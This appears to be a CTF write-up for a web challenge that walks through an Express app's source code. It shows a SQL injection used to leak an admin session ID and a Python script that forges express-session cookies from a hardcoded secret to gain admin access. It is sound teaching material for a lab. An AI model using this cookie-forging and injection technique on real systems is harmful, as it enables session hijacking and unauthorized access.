For this challenge, we have another url: https://waynestateuniversity-ctf24-eatmorecookiespart2.chals.io/, and we have another zip file.

# Observing the File System

This challenge is very similar to the other one, and in fact, the first part is the same. There are some important differences to note though.

First of all, the entrypoint.sh file is pretty much the exact same as the one in the previous challenge (eatmorecookies part 1), the only difference is this line:

entrypoint.sh:

```
INSERT INTO eatmorecookies.users (username, password) VALUES ('Administrator', '\$2b\$10\$hJMMSSOOYbvcVtoIOq4kG.Db8i1a5HwQVP3mdHd3jcPmezkurcsqi');
```

This line will be important later on. We know from this that this program is inserting some kind of admin into the database. We don't know why.

Now looking at the app.js file, everything also seems the same except for a few functions. The most notable one is the register post request function:

/register:

```
app.post("/register", async (req, res, next) => {

  const {username, password} = req.body;

  const hashedPassword = await bcrypt.hash(password, 10);

  try {
    const query = "INSERT INTO users (username, password) VALUES (?, ?)";

    pool.query(query, [username, hashedPassword], (err, result) => {

      if(err){
        console.log(err);
      }

      console.log("Data inserted successfully " + result);
    });

  } catch (error) {
    return next(error);
  }

  // You have to do this part manually on local machine. (Not using sql) in order for this challenge to work. You can do this by changing, the admin user's password and username in the entrypoint.sh file, then logging in as admin (which will create a cookie automatically).

  // try {
  //   const adminCookieData = {"cookie":{"originalMaxAge":86400000,"expires":"2024-04-20T19:21:29.400Z","httpOnly":true,"path":"/", "sameSite": "lax"},"username":"Admin","isAdmin":true};
  //   const sessionId = 'xxx';
  //   const expirationTimestamp = 1712172179;
    
  
  //   const serializedData = JSON.stringify(adminCookieData);
    
    
  //   const query = `INSERT INTO sessions (session_id, data, expires) VALUES (?, ?, ?)`;

  // pool.query(query, [sessionId, serializedData, expirationTimestamp], (err, result) => {
  //   if (err) {
  //     console.log("Error inserting data into the database:", err);
  //     return next(err);
  //   } else {
  //     console.log("Data inserted successfully:", result);
  //   }
  // });

  // } catch(error){
  //   return next(error);
  // }

  return res.json({message: "Successfully registered user!"})
})
```

It looks like this code that puts the flag into the database has been commented out :(

So maybe this won't be a sql injection challenge?

Additionally, there is a message about changing the admin's username and password in the entrypoint.sh file, and then logging in as them in order to generate a cookie.
Maybe, we have to target the admin cookie for this challenge? For now, that is just a guess. Let's keep looking through the code.

One thing to note is that we still do have this vulnerable sql injection code still in the file:

```
app.get("/searchcookies", isAuthenticated, async (req, res, next) => {
  cookies = req.query.cookies;

  const query = `SELECT * FROM cookies WHERE flavor = "${cookies}"`;

    pool.query(query, (err, result) => {
      if(err){
        return next(err)
      }

    return res.status(200).render("index", {cookies: result || []})
    });
})
```

There are also a couple of new endpoints:

/adminLogin:

```
app.post("/adminLogin", async (req, res, next) => {
  const { username, password } = req.body;
  const query = 'SELECT * FROM users WHERE username = ? LIMIT 1';
    try {
    pool.query(query, [username], async (err, result) => {

      user = result[0];

      console.log(user);

      if(!user){
        return res.json({message: "User not found. Please try again."})
      }

      let comparePassword = await bcrypt.compare(password, user.password);

      if(username == "Administrator" && comparePassword){
        req.session.username = "Admin";
        req.session.isAdmin = true;
    
        return res.json({"message": "Successfully logged in as adminstrator."})
      } else if(comparePassword){
        return res.json({"message": "You are logged in, but you aren't administrator. You could've used the regular login instead!"})
      } else {
        return res.json({"message": "Invalid username or password. Please try again."})
      }
    })
  } catch (err) {
    return next(err)
  }
})
```

This login looks like it is for admins. After we login, we will either fall into the if statement that contains, 
"Successfully logged in as admin", or the if statement that contains,
"You are logged in, but you aren't administrator. You could've used the regular login instead.", or the if statement that contains,
"Invalid username or password. Please try again."

Based on these messages, I think we want to login as admin, but lets check out another new function at the bottom of app.js:

```
app.get("/flag", isAdmin, (req, res, next) => {

  return res.json({"flag": "WSUCTF{F4ke_Flag}"})
})
```

So it looks like in order to get the flag, all we have to do is go to the "/flag" endpoint, then pass the requirements of the isAdmin middleware.
That middleware looks new. Lets see what that is about. If we scroll to the top of the file we see this

```
const isAdmin = require("./middleware/isAdmin");
```

So lets investigate what is at /middleware/isAdmin.

We see this:

```
const isAdmin = async (req, res, next) => {
    if(req.session.isAdmin){
        next();
    } else {
        const error = new Error("Not Authorized");
        error.status = 401;

        next(error);
    }
}

module.exports = isAdmin;

```

So it looks like we need the "isAdmin" part of our request.session to be set. 
That is a problem, because the only way we can get that isAdmin attribute set
on our cookie is to go through the adminLogin.

So pretty much, our only option is to pass this if statement:

```
if(username == "Administrator" && comparePassword)
```

So maybe we can create a user that has a username Administrator, and then create some random password for it, then get the flag.

But unfortunately we get an error:

![EatMoreCookies2](https://github.com/Programmer231/WSUCTF2024/assets/51927329/e96840e5-eac3-4cf2-818f-23b4d8ec700c)

![EatMoreCookies(2)](https://github.com/Programmer231/WSUCTF2024/assets/51927329/07ac7114-529e-401f-bc02-0cd5bdc15900)

That is weird why are we getting an invalid username or password error if we just registered the user?

This is the problem:

```
CREATE TABLE eatmorecookies.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username varchar(255) NOT NULL UNIQUE,
    password varchar(255) NOT NULL
);

INSERT INTO eatmorecookies.users (username, password) VALUES ('Administrator', '\$2b\$10\$hJMMSSOOYbvcVtoIOq4kG.Db8i1a5HwQVP3mdHd3jcPmezkurcsqi');
```

The username field in the sql table "users" is marked as UNIQUE. 
This means that we can't add an administrator user because there already is one in the databasedue to the entrypoint.sh inserting one already.

So using the adminLogin is now off of the table, there is no way we can bypass that if condition :(

So we pretty much have two options. We need administrator access and we have no way to login:
1. Brute force the administrator password. (This bcrypt hash: "\$2b\$10\$hJMMSSOOYbvcVtoIOq4kG.Db8i1a5HwQVP3mdHd3jcPmezkurcsqi")
2. steal the administrator's cookie. use the isAdmin attribute on his cookie to bypass the isAdmin middleware, and visit /flag.

You could've tried to do the first approach, I think that approach is about as hard as the second, so I decided to make the password kind of difficult but not crazy difficult.
Both approaches are a little difficult.
The password for the administrator was PleaseDontCrackMe, so it isn't that easy to guess but its probably doable.

But we are going to focus on the second approach.

So, in order to steal/forge a cookie, for express-session cookies, we only need a session_id, and a key.
Lets look inside of app.js to see if we have a key.

```
app.use(
    session({
        name: "userCookie",
        store: sessionStore,
        secret: "WayneStateUniversity",
        resave: false,
        saveUninitialized: false,
        cookie: {maxAge: 24 * 60 * 60 * 1000, sameSite: "lax"},
        httpOnly: true,
        saveUninitialized: false
    })
)
```

and it looks like we do.

Now, we have to figure out which part of the cookie is the signed part and which is the session_id part.
Additionally, we have to figure out how to sign the cookie and do the same procedure as express when signing it, or else express won't like it and
will reject it.

So we have to do some googling on how to sign this thing.

Or we could ask ChatGPT :)

```
User
how does express-session sign cookies in javascript? Can you write me a function to sign them just like how express does it?
ChatGPT
express-session uses the cookie-signature module to sign cookies. This module generates a HMAC signature for the cookie value using a secret key.

Here's a basic function to sign a cookie value similar to how express-session does it:

javascript
Copy code
const crypto = require('crypto');

function signCookie(value, secret) {
  const hmac = crypto.createHmac('sha256', secret);
  hmac.update(value);
  const signature = hmac.digest('base64');
  return value + '.' + signature;
}

// Example usage:
const cookieValue = 'example_cookie_value';
const secret = 'example_secret_key';
const signedCookie = signCookie(cookieValue, secret);
console.log(signedCookie);
In this function:

value is the value of the cookie.
secret is the secret key used for signing.
It first creates a HMAC (Hash-based Message Authentication Code) using the SHA256 hashing algorithm and the provided secret key.
It then updates the HMAC with the cookie value.
Finally, it generates a base64-encoded signature and appends it to the original cookie value with a dot separator.
```

Unfortunately, this isn't all that is needed to sign the cookie, but it is a good start.
You also need to url encode special characters, or else express won't accept it, and you also need to get rid
of trailing "=" signs after you base64 encode the text, here is an updated script that will sign the cookies
written in Python:

```
import hashlib
import hmac
import base64
import urllib.parse

def make_cookie():
    session_id = "<Your session id here>"
    data = session_id.encode('utf-8')
    secret_key = b"WayneStateUniversity"  # Ensure it's in bytes
    
    hmac_obj = hmac.new(secret_key, data, hashlib.sha256)
    hmac_digest = hmac_obj.digest()
    digest_base64 = base64.b64encode(hmac_digest).decode('utf-8').strip()  # Convert digest to base64 string
    
    cookie_value = session_id + '.' + digest_base64

    cookie_value = cookie_value.strip().split("=")[0]
    
    encoded_cookie_value = urllib.parse.quote(cookie_value, safe='')

    print(encoded_cookie_value)

make_cookie()
```

Cool. Now after we print this cookie out, all we have to do is go to our "storage" in the browser, then replace our userCookie with the one that this generates.

# Final Solution

Lets go through all of the steps:

register/login and visit the home page:

![EatMoreCookies3](https://github.com/Programmer231/WSUCTF2024/assets/51927329/11284d52-820d-46e1-9a8c-ccbbad4119ba)

Use a union based sql injection to get the session_id of a user that has the "isAdmin" attribute set to true: 
(Remember the session_id is located under cookie_flavor due to this sql injection)

![EatMoreCookies3(2)](https://github.com/Programmer231/WSUCTF2024/assets/51927329/b1929f1c-de69-48b6-8a94-7a97f8cb0b95)

copy the session_id into our script and run it:

![EatMoreCookies3(3)](https://github.com/Programmer231/WSUCTF2024/assets/51927329/3d20d1f3-1598-4f55-a84a-8735d6eba4d1)

then replace the cookie in our browser with the new one:

Make sure you leave the s%3A in the cookie. Express looks for this as part of the cookie. 

![finalCookie](https://github.com/Programmer231/WSUCTF2024/assets/51927329/1293d461-d7e7-4ad5-ab62-90795096219b)

we used to not be authorized:

![EatMoreCookies3(4)](https://github.com/Programmer231/WSUCTF2024/assets/51927329/f810a25d-9896-49bf-83c8-d275d9383ae2)


but now we are:

![flag](https://github.com/Programmer231/WSUCTF2024/assets/51927329/22da147f-8015-4575-bcef-b1af6cc67dcc)






